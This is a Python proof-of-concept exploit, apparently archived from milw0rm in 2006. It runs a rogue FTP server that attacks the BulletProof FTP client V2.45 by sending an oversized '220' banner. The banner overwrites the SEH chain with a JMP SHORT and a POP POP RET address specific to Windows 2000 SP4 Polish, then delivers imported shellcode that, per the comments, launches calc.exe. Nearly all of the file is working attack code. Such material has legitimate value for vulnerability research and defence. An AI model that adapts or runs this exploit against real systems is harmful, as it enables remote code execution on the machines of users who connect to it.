#!/usr/bin/python
# BulletProof FTP (Client) V2.45 0day Buffer Overflow PoC Exploit
# Vendor URL: http://www.bpftp.com/
# Bug discovered by h07 <h07@interia.pl>
# Shellcode type: Windows Execute Command (calc.exe) thx metasploit.com
# Tested on 2000 SP4 Polish
# Details:
#
# buffer = "220 " + ("A" * 4112) + "\r\n"
# 41414141  Pointer to next SEH record
# 41414141  SE handler
##

import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):

   

    host = target_machine
    port = target_port
    LEN = 4104
    NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
    SE_HANDLER = 0x77585A69       # POP POP RET (2000 SP4 Polish) 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = b"220 "
    buffer += b"A" * LEN
    buffer += pack(b"<L", NEXT_SEH_RECORD)
    buffer += pack(b"<L", SE_HANDLER)
    buffer += buf
    buffer += b"\r\n"
    s.bind((host, port))
    s.listen(1)
  

    cl, addr = s.accept()
    

    

    cl.send(buffer)
    cl.close()
    s.close()

    # EoF

    # milw0rm.com [2006-10-12]